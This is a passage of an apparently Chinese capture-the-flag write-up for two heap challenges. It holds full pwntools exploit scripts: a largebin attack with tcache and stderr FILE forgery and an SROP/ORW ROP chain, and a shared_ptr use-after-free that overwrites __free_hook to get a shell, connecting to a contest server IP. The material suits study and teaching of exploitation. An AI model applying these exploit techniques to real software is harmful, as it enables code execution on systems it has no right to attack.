    def Show(idx):
        Cmd(4)
        sh.recvuntil('Index: ')
        Num(idx)
        sh.recvuntil('Content: ')
    #chunk arrange
    Create(0x420)   #A
    Create(0x420)   #B  gap
    Create(0x410)   #C
    Create(0x410)   #D  gap
    Create(0x430)   #E
    Create(0x410)   #F  gap
    Create(0x440)   #G
    #leak libc addr
    Delete(0)       #UBA
    Create(0x450)   #LBA     A|B|C|D|top 
    Show(0)
    libc.address = u64(sh.recv(6).ljust(8, '\x00'))-0x1e3ff0
    Log('libc.address')
    #tcache ptr in TLS = chunkA
    addr = libc.address+0x1eb538
    exp = flat(0, 0, 0, addr-0x20)
    Edit(0, exp)
    Delete(2)       #UBchunkC
    Create(0x450)   #trigger sort
    #leak heap addr
    Show(0)
    heap_addr = u64(sh.recv(6).ljust(8, '\x00'))-0xb10
    Log('heap_addr')
    #withdraw chunk C, so tcache = chunk A
    Create(0x410)
    #stderr = chunkC
    addr = libc.address+0x1e47a0
    exp = flat(0, 0, 0, addr-0x20)
    Edit(0, exp)
    Delete(9)       #UBchunkC
    Create(0x450)   #trigger sort
    #forge tcache
    exp = p16(0x7)*64   #tcache.counts
    exp+= p64(libc.symbols['__free_hook']-0x10)*64
    Edit(0, exp)
    #GDB()
    #forge stderr
    '''
      char *_IO_read_ptr;    /* Current read pointer */
      char *_IO_read_end;    /* End of get area. */
      char *_IO_read_base;    /* Start of putback+get area. */
      char *_IO_write_base;    /* Start of put area. */
      char *_IO_write_ptr;    /* Current put pointer. */
      char *_IO_write_end;    /* End of put area. */
      char *_IO_buf_base;    /* Start of reserve area. */
      char *_IO_buf_end;    /* End of reserve area. */
    '''
    old = heap_addr + 0x6f0     #old = chunkB
    exp = p64(0xfbad2087)
    exp+= flat(0, 0, 0)
    exp+= flat(old, old+0x100, 0)
    exp+= flat(old, old+0x100)
    exp = exp.ljust(0x88, '\x00')
    exp+= p64(libc.address+0x1e6680)
    exp = exp.ljust(0xd8, '\x00')
    exp+= p64(libc.address+0x1E5580-0x8*4)  #f->vtable = _IO_str_jumps-0x8*4
    Edit(2, exp[0x10:])
    #SROP
    rdx_GG = libc.address+0x14b760  #mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
    rdi = libc.address+0x2858f
    rsi = libc.address+0x2ac3f
    rdx_r12 = libc.address+0x114161
    syscall = libc.address+0x611ea
    rax = libc.address+0x45580
    ret = libc.address+0x26699
    buf = heap_addr+0x200
    def Call(sys, a, b, c):
        return flat(rax, sys, rdi, a, rsi, b, rdx_r12, c, 0, syscall)
    exp = '\x00'*0x8
    exp+= p64(heap_addr+0x708)
    exp+= p64(rdx_GG)
    frame = SigreturnFrame()
    frame.rip = ret
    frame.rsp = heap_addr+0x800
    frame['uc_stack.ss_size'] = libc.symbols['setcontext']+61
    exp+= str(frame)
    #ORW rop
    exp+= Call(0, 0, buf, 0x30)
    exp+= Call(2, buf, 0, 0)
    exp+= Call(0, 3, buf, 0x30)
    exp+= Call(1, 1, buf, 0x30)
    Edit(1, exp)
    #forge av->top and trigger assert fail
    Delete(6)
    Create(0x450)       #LBG
    addr = libc.address+0x1e3c00
    exp = flat(0, 0, 0, addr-0x20)
    Edit(6, exp)
    Delete(4)
    #trigger sort=> top=chunkE => sysmalloc() => assert fail => printf(stderr)
    Cmd(1)
    sh.recvuntil('(: Size: ')
    Num(0x450)
    sleep(2)
    sh.sendline('./flag\x00')
    sh.interactive()
###  总结
  * LargeBinAttack的思路 
    * 打TLS中的tcache指针
    * 打rtld中的exit函数链表
    * 打stderr的_IO_FILE, 触发largebin中的assert error进入printf(stderr, …)
    * 利用写入victim地址区伪造自闭链表, 然后尝试进行任意地址分配
  * 通过_IO_str_overflow触发malloc, memcpy, free
## cissh
###  程序分析
  * 关键是Manager对象, 根据初始化函数可以发现 
    * this+0x是一个vector >, 保存创建的文件
    * this+0x18是一个vector , 会把读入的cmd以空格分割保存为数组
    * this+0x30是一个map, 是一个命令到对应函数的映射, 支持下面的命令 
      * touch
      * ls
      * vi
      * cat
      * rm
      * ln
  * File结构 
    * string name 保存文件名
    * shared_ptr cont
    * string type, 如果是正常的文件则为”file” 如果是ln的文件则为”link”
###  思路
  * 由于有ln的存在,因此漏洞只能出现在每个文件cont部分的shared_ptr上, 后来测试了一下发现, 当链接之后, shared_ptr cont;的引用技术不会增加, 还是1, 这就会导致UAF
  * 经过测试发现如果有A1->A, 先rm(A), 这样A1的cont就是被释放过的
  * 但是需要注意一点, 由于string有一个局部缓冲区特性, 长度小于0x10的话,使用结构体内部缓冲区, 直接去free的话会报错
  * 能构造出UAF思路就清楚了, 先用7个chunk填满tcache, 然后释放一个chunk到UB中, UAF读泄露libc地址, 然后直接tcache attack打__free_hook
###  EXP
    #! /usr/bin/python2
    # coding=utf-8
    import sys
    from pwn import *
    from random import randint
    context.log_level = 'debug'
    context(arch='amd64', os='linux')
    elf_path = "./pwn"
    elf = ELF(elf_path)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    def Log(name):    
        log.success(name+' = '+hex(eval(name)))
    if(len(sys.argv)==1):            #local
        cmd = ['/home/chenhaohao/pwn']
        sh = process(cmd)
        proc_base = sh.libs()['/home/chenhaohao/pwn']
    else:                        #remtoe
        sh = remote('39.105.134.183', 18866)
    def GDB():
        gdb.attach(sh, '''
        break *free
        ''')
    def Cmd(n):
        sh.recvuntil('\x1B[31m$ \x1B[m')
        sh.sendline(n)
    def touch(name):
        Cmd('touch %s'%(name))
    def vi(name, cont):
        Cmd('vi %s'%(name))
        sh.sendline(cont)
    def rm(name):
        Cmd('rm %s'%(name))
    def cat(name):
        Cmd("cat %s"%(name))
    def ln(new, old):
        Cmd("ln %s %s"%(new, old))
    #prepare chunk
    for i in range(8):
        name = "A%d"%(i)    
        touch(name)
        vi(name, str(i)*0x300)
    #make ln
    ln("l_A0", "A0")
    ln("l_A7", "A7")
    #full Tcache, Tcache->A7->A6->...->A1
    for i in range(1, 8):
        name = "A%d"%(i) 
        rm(name)
    #get UB chunk
    rm("A0")        #UBA0 and l_A0->A0
    #leak addr
    cat("l_A0")
    libc.address = u64(sh.recv(8))-0x1ebbe0
    Log('libc.address')
    #forge tcache list
    vi("l_A7", flat(libc.symbols['__free_hook']))
    #control __free_hook
    touch("A7")
    vi("A7", '7'*0x300)
    touch("shell")
    vi("shell", '/bin/sh\x00'*8)
    touch("hook")
    vi("hook", p64(libc.symbols['system']).ljust(0x300, '\x00'))
    #getshell
    #GDB()
    rm('shell')
    sh.interactive()
    '''
    telescope 0x0000555555578ec0 3
    '''